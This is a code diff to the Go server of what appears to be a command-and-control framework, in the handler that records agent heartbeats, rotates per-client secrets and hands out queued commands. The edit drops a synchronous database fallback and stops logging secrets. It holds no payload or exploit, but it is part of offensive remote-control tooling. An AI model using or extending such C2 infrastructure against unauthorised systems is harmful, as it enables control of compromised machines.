@@ -5,7 +5,6 @@ import (
 	"c2/internal/common/config"
 	"c2/internal/common/interfaces"
 	"c2/internal/common/transforms"
-	"context"
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
@@ -41,26 +40,12 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 	}
 
 	// Record heartbeat for batched database update (async, non-blocking)
-	// This replaces the synchronous UPDATE that was causing DB contention
+	// The batched writer is the single source for lastSEEN updates to avoid
+	// duplicate writes and reduce DB contention.
 	if m.heartbeatBatcher != nil {
 		m.heartbeatBatcher.RecordHeartbeat(clientID)
-		log.Printf("[GetRequest] Recorded heartbeat for agent %s (batched)", clientID)
 	} else {
-		// Fallback to synchronous update if batcher not initialized
-		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-		defer cancel()
-
-		_, err = m.db.ExecContext(ctx, `
-			UPDATE connections
-			SET lastSEEN = CURRENT_TIMESTAMP
-			WHERE newclientID = $1`,
-			clientID,
-		)
-		if err != nil {
-			log.Printf("[GetRequest] Failed to update lastSEEN in database: %v", err)
-		} else {
-			log.Printf("[GetRequest] Successfully updated lastSEEN in database for agent %s", clientID)
-		}
+		log.Printf("[GetRequest] WARNING: heartbeat batcher not initialized, skipping lastSEEN update for agent %s", clientID)
 	}
 
 	// Broadcast last seen update via WebSocket
@@ -71,8 +56,7 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 		log.Printf("[GetRequest] Successfully broadcast last seen for agent %s", clientID)
 	}
 
-	log.Printf("[GetRequest] Current secret1 for clientID %q: %s", clientID, activeConn.Secret1)
-	log.Printf("[GetRequest] Current secret2 for clientID %q: %s", clientID, activeConn.Secret2)
+	log.Printf("[GetRequest] Secrets loaded for clientID %q", clientID)
 
 	// Retrieve commands for the clientID
 	log.Printf("[GetRequest] Attempting to get commands for clientID: %q", clientID)
@@ -265,8 +249,6 @@ normalCommand:
 	activeConn.Secret1 = newSecret
 
 	log.Printf("[GetRequest] Rotated secrets for clientID %q", clientID)
-	log.Printf("[GetRequest] New secret1: %s", activeConn.Secret1)
-	log.Printf("[GetRequest] New secret2: %s", activeConn.Secret2)
 
 	cmdBuffer.DeleteCommand(clientID)
 	log.Printf("[GetRequest] Command deleted for clientID: %q", clientID)
